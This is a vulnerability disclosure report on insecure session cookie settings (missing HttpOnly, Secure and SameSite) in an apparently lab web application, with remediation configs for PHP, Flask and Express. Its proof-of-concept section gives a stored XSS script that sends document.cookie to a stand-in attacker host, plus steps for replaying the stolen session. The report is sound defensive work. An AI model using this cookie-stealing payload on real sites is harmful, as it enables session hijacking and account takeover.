@@ -1,0 +1,193 @@
+================================================================================
+VULNERABILITY DISCLOSURE REPORT
+Web Application Security Assessment — Project 5
+================================================================================
+Finding ID    : VULN-04
+Date          : June 17, 2026
+Version       : 1.0 — Final
+Classification: Confidential — Internal Use Only
+================================================================================
+
+[1] VULNERABILITY OVERVIEW
+--------------------------------------------------------------------------------
+Title              : Insecure Session Management & Missing Cookie Security Flags
+Vulnerability Type : Insecure Session Management / Cookie Misconfiguration
+CWE Reference      : CWE-1004 — Sensitive Cookie Without 'HttpOnly' Flag
+                     CWE-614  — Sensitive Cookie in HTTPS Session Without
+                                'Secure' Attribute
+                     CWE-352  — Cross-Site Request Forgery (CSRF) — compounded
+                                by missing SameSite attribute
+                     CWE-384  — Session Fixation
+OWASP Top 10       : A07:2021 — Identification and Authentication Failures
+WSTG Reference     : WSTG-SESS-02 — Testing for Cookies Attributes
+                     WSTG-SESS-05 — Testing for Cross Site Request Forgery
+                     WSTG-SESS-03 — Testing for Session Fixation
+CAPEC Reference    : CAPEC-60 — Reusing Session IDs (a.k.a. Session Replay)
+                     CAPEC-61 — Session Fixation
+Severity           : MEDIUM
+CVSS v3.1 Score    : 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
+CVSS Vector        : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
+Affected Target    : Application-wide Session Cookie Management
+Affected Cookies   : PHPSESSID, security
+Inspection Method  : Browser DevTools → Application → Cookies /
+                     HTTP Response Header Analysis
+Remediation Status : UNRESOLVED — Medium Priority Action Required (P3)
+
+[2] TECHNICAL DESCRIPTION
+--------------------------------------------------------------------------------
+An examination of the application's HTTP response headers and browser-level
+cookie storage (via Developer Tools) revealed that the primary session
+identifier cookie (PHPSESSID) is issued with a fundamentally insecure
+configuration — missing three essential security protection attributes.
+
+2a. MISSING HttpOnly FLAG (Primary Risk):
+    The HttpOnly attribute prevents client-side scripts (JavaScript) from
+    accessing the cookie via the document.cookie DOM API. Without this flag,
+    any successfully injected XSS payload (see VULN-02) can trivially exfiltrate
+    the session token to an attacker-controlled server, enabling full session
+    hijacking without requiring the user's credentials.
+
+2b. MISSING Secure FLAG (Secondary Risk):
+    The Secure attribute instructs the browser to only transmit the cookie over
+    encrypted HTTPS connections. Without this flag, the session token is
+    transmitted in plaintext over HTTP, making it vulnerable to passive network
+    interception (man-in-the-middle / ARP spoofing on local networks).
+
+2c. MISSING SameSite ATTRIBUTE (Tertiary Risk):
+    The SameSite attribute controls whether the cookie is sent with cross-site
+    requests. Without it (defaulting to SameSite=None in legacy browsers), the
+    application is vulnerable to Cross-Site Request Forgery (CSRF) attacks,
+    where a malicious third-party site can trigger state-changing requests on
+    behalf of an authenticated user.
+
+2d. PREDICTABLE SESSION ID FORMAT (Informational):
+    The PHPSESSID value (9a8b7c6d5e4f3a2b1c0d) appears to follow a structured
+    hexadecimal pattern. Production session IDs should use
+    cryptographically-secure random generators (CSPRNG) with at minimum 128
+    bits of entropy.
+
+Root Cause: Missing server-side session cookie security configuration.
+
+[3] COOKIE ATTRIBUTE AUDIT EVIDENCE
+--------------------------------------------------------------------------------
+Inspection Method : Browser DevTools (F12) → Application → Cookies
+Observed Set-Cookie Header from HTTP Response:
+    Set-Cookie: PHPSESSID=9a8b7c6d5e4f3a2b1c0d; Path=/
+    Set-Cookie: security=low; Path=/
+
+Cookie Security Attribute Audit Table:
++------------------+-------------------+-------------------+-------------------+---------------------------+
+| Cookie Name      | HttpOnly Flag     | Secure Flag       | SameSite Attr     | Overall Risk Status       |
++------------------+-------------------+-------------------+-------------------+---------------------------+
+| PHPSESSID        | ❌ MISSING        | ❌ MISSING        | ❌ Not Set        | CRITICAL — Hijack Risk    |
+| security         | ❌ MISSING        | ❌ MISSING        | ❌ Not Set        | HIGH — Tamperable Value   |
++------------------+-------------------+-------------------+-------------------+---------------------------+
+
+Expected Secure Configuration (for reference):
+    Set-Cookie: PHPSESSID=<random_token>; Path=/; HttpOnly; Secure; SameSite=Lax
+
+[4] PROOF OF CONCEPT — SESSION HIJACKING VIA XSS CHAIN
+--------------------------------------------------------------------------------
+This finding is chained with VULN-02 (Stored XSS) to demonstrate practical
+session hijacking in an end-to-end attack scenario:
+
+Step 1: Exploit Stored XSS vulnerability (VULN-02) to inject the following
+        payload into the guestbook form:
+
+    Name    : Attacker
+    Message : <script>
+                var img = new Image();
+                img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
+              </script>
+
+Step 2: Any authenticated user who visits the guestbook triggers the script.
+
+Step 3: The PHPSESSID cookie value (e.g., 9a8b7c6d5e4f3a2b1c0d) is transmitted
+        to the attacker's server in the query string of the image request.
+
+Step 4: Attacker imports the stolen session token into their browser:
+        - Open DevTools (F12) → Application → Cookies
+        - Manually set PHPSESSID = 9a8b7c6d5e4f3a2b1c0d
+        - Navigate to a protected page → Authentication is bypassed.
+
+Attack Impact: Full account takeover without knowledge of the victim's password.
+
+[5] IMPACT ASSESSMENT
+--------------------------------------------------------------------------------
+Confidentiality Impact : HIGH — Session token exfiltration enables full
+                         account takeover and access to all user data.
+
+Integrity Impact       : MEDIUM — Attacker can perform authenticated actions
+                         (form submissions, setting changes) as the victim.
+
+Availability Impact    : LOW — Account can be locked or manipulated, preventing
+                         the legitimate owner from accessing their account.
+
+Compound Risk:
+  This finding compounds significantly with VULN-02 (XSS). The combination of
+  Stored XSS and missing HttpOnly creates an automated, persistent account
+  takeover vulnerability that affects ALL users who visit the guestbook page.
+
+Business Impact:
+  - Mass user session compromise from a single stored payload injection.
+  - GDPR Article 32 — inadequate technical security measures for data protection.
+  - PCI DSS Requirement 6.5.10 — broken authentication and session management.
+
+[6] REMEDIATION — SECURE IMPLEMENTATION
+--------------------------------------------------------------------------------
+PRIMARY FIX: Enforce Secure Cookie Attributes in Server Configuration
+
+php.ini (Web Server Configuration):
+    session.cookie_httponly = 1      ; Block JavaScript access (XSS mitigation)
+    session.cookie_secure   = 1      ; HTTPS-only transmission
+    session.cookie_samesite = "Lax"  ; CSRF protection
+    session.use_strict_mode = 1      ; Reject externally imposed session IDs
+    session.cookie_lifetime = 1800   ; 30-minute idle timeout
+
+PHP Programmatic Configuration (alternative to php.ini):
+    ini_set('session.cookie_httponly', 1);
+    ini_set('session.cookie_secure', 1);
+    ini_set('session.cookie_samesite', 'Lax');
+    session_start();
+
+Python (Flask Example):
+    app.config.update(
+        SESSION_COOKIE_HTTPONLY=True,
+        SESSION_COOKIE_SECURE=True,
+        SESSION_COOKIE_SAMESITE='Lax',
+        PERMANENT_SESSION_LIFETIME=1800
+    )
+
+Node.js (express-session Example):
+    app.use(session({
+        secret: process.env.SESSION_SECRET,
+        cookie: {
+            httpOnly: true,
+            secure: true,       // requires HTTPS
+            sameSite: 'lax',
+            maxAge: 1800000     // 30 minutes in ms
+        }
+    }));
+
+ADDITIONAL SESSION SECURITY CONTROLS:
+  - Regenerate session ID after successful authentication:
+      session_regenerate_id(true); // PHP
+  - Enforce HTTPS across the entire application using HSTS header:
+      Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+  - Implement session timeout and absolute maximum session lifetime.
+  - Use cryptographically-secure session ID generation (128-bit minimum entropy).
+  - Validate session origin using IP binding (optional — may break mobile).
+
+[7] REFERENCES
+--------------------------------------------------------------------------------
+  - OWASP Session Management Cheat Sheet:
+    https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
+  - CWE-1004: https://cwe.mitre.org/data/definitions/1004.html
+  - CWE-614:  https://cwe.mitre.org/data/definitions/614.html
+  - WSTG-SESS-02: https://owasp.org/www-project-web-security-testing-guide/
+  - NIST SP 800-63B — Digital Identity Guidelines (Session Management)
+  - RFC 6265 — HTTP State Management Mechanism (Cookie Specification)
+
+================================================================================
+END OF FINDING — VULN-04 — INSECURE SESSION MANAGEMENT
+================================================================================
